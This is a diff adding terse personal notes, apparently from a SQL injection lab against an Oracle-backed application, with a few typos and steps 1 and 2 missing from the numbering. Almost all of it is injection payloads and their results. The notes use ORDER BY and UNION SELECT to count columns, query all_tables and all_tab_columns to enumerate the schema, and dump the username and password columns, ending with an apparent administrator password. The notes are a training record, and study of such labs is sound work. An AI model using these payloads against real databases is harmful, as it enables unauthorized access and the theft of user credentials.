@@ -1,0 +1,23 @@
+' ORDER BY 3 -- 
+2 columns
+
+' UNION SELECT 'a','a' FROM DUAL -- 
+internal server error, may it'd be a oracle database
+
+3. LIST THE TABLES
+SELECT TABLE_NAME,NULL FROM all_tables --
+
+tablee name : USERS_NWXHNQ
+
+4. gte the columns 
+SELECT COLUMN_NAME,null FROM all_tab_columns WHERE table_name = 'USERS_NWXHNQ' --
+
+USERNAME_JVZWCH
+PASSWORD_WRWXHF
+
+' UNION SELECT USERNAME_JVZWCH, PASSWORD_WRWXHF FROM USERS_NWXHNQ --
+
+YOu GOT the admibn username and password
+administrator
+659kvq5up13xu5sw6hsq
+
